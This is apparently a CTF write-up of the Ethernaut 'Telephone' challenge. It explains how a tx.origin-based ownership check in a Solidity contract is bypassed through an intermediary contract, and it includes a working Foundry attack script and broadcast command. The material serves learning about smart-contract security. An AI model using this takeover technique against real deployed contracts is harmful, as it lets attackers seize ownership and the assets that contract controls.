---
title: 'Telephone - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level4.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-17
lastmod: 2025-09-17
---

## Challenge Overview

In this level, the goal is to claim ownership of the Telephone contract. The contract appears to have a safeguard that prevents direct ownership changes, but it uses a flawed authentication check that can be bypassed by calling through an intermediary contract.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

---

## Exploit Explanation

The vulnerability lies in the difference between `tx.origin` and `msg.sender`:

```solidity
if (tx.origin != msg.sender) {
    owner = _owner;
}
```

* `tx.origin` refers to the **original externally owned account (EOA)** that initiated the transaction
* `msg.sender` refers to the **immediate caller** of the function

When you call the contract directly from your wallet, both `tx.origin` and `msg.sender` are your address, so the condition fails.

However, if you call through an intermediary contract:
* `tx.origin` remains your EOA address (the transaction originator)
* `msg.sender` becomes the address of your intermediary contract

This creates the required inequality (`tx.origin != msg.sender`) that allows the ownership change.

The exploit involves:
1. Deploying an attacker contract
2. Calling the attacker contract's exploit function
3. The attacker contract calls `changeOwner()` on the Telephone contract, creating the necessary `tx.origin != msg.sender` condition

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Telephone.sol";

contract Attack {
    Telephone public telephoneInstance;
    address evilOwner;

    constructor(Telephone _telephoneInstance, address _evilOwner) {
        telephoneInstance = _telephoneInstance;
        evilOwner = _evilOwner;
    }

    function exploit() public {
        telephoneInstance.changeOwner(evilOwner);
    }
}

contract TelephoneSolution is Script {
    Telephone public telephoneInstance = Telephone(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // Deploy attacker contract
        Attack attacker = new Attack(
            telephoneInstance,
            vm.envAddress("MY_ADDRESS")
        );
        
        // Execute the exploit
        attacker.exploit();
        
        // Verify the results
        console.log("The owner of the contract is:", telephoneInstance.owner());
        console.log("My address is:", vm.envAddress("MY_ADDRESS"));
        
        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Execute the exploit with Foundry:

```bash
forge script script/TelephoneSolution.s.sol --rpc-url $SEPOLIA_URL --tc TelephoneSolution --broadcast
```